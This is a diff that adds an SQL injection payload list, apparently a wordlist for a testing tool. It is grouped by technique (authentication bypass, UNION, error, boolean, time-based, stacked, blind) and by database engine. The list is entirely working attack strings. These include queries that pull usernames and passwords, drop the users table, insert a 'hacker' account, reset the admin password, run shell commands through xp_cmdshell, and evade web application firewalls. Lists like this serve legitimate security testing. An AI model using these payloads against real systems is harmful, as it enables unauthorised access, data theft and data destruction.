@@ -1,4 +1,133 @@
-# Payloads SQLi comunes
+# SQL Injection Payloads
+# Organizados por tipo de ataque y DBMS
+
+# === AUTHENTICATION BYPASS ===
 ' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
 " OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" #
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# === UNION BASED ===
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT username,password FROM users--
+1' UNION SELECT table_name,NULL FROM information_schema.tables--
+1' UNION SELECT column_name,NULL FROM information_schema.columns--
+
+# === ERROR BASED ===
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+
+# === BOOLEAN BASED ===
+' AND '1'='1
+' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+1 AND 1=1--
+1 AND 1=2--
+
+# === TIME BASED ===
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('test'))--
+'; WAITFOR DELAY '00:00:05'--
+' AND pg_sleep(5)--
+1' AND SLEEP(5)--
+1'; WAITFOR DELAY '00:00:05'--
+
+# === STACKED QUERIES ===
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','pass')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+1'; SELECT * FROM users--
+
+# === COMMENT INJECTION ===
 --
+#
+/*
+*/
+;%00
+--+
+-- -
+
+# === MYSQL SPECIFIC ===
+' OR 1=1#
+' UNION SELECT NULL,NULL,NULL#
+' AND SLEEP(5)#
+' AND extractvalue(1,concat(0x7e,database()))#
+' AND updatexml(1,concat(0x7e,user()),1)#
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#
+
+# === MSSQL SPECIFIC ===
+' OR 1=1--
+'; EXEC xp_cmdshell('dir')--
+'; WAITFOR DELAY '00:00:05'--
+' AND 1=CONVERT(int,@@version)--
+' UNION SELECT NULL,NULL,NULL--
+
+# === POSTGRESQL SPECIFIC ===
+' OR 1=1--
+' UNION SELECT NULL,NULL,NULL--
+' AND pg_sleep(5)--
+'; SELECT version()--
+' AND CAST(version() AS int)=1--
+
+# === ORACLE SPECIFIC ===
+' OR 1=1--
+' UNION SELECT NULL,NULL FROM dual--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+' AND UTL_INADDR.get_host_name((SELECT version FROM v$instance))=1--
+
+# === SQLITE SPECIFIC ===
+' OR 1=1--
+' UNION SELECT NULL,NULL,NULL--
+' AND SUBSTR(sqlite_version(),1,1)='3'--
+
+# === WAF BYPASS ===
+' /*!OR*/ 1=1--
+' %23OR%23 1=1--
+' /**/OR/**/1=1--
+' OR/**/1=1--
+'OR'1'='1
+'%20OR%20'1'='1
+'+OR+1=1--
+'||'1'='1
+
+# === SECOND ORDER ===
+admin'--
+test' UNION SELECT NULL--
+user' OR '1'='1
+
+# === BLIND INJECTION ===
+' AND SUBSTRING(version(),1,1)='5
+' AND ASCII(SUBSTRING(database(),1,1))>100
+' AND LENGTH(database())>5
+' AND (SELECT COUNT(*) FROM users)>0
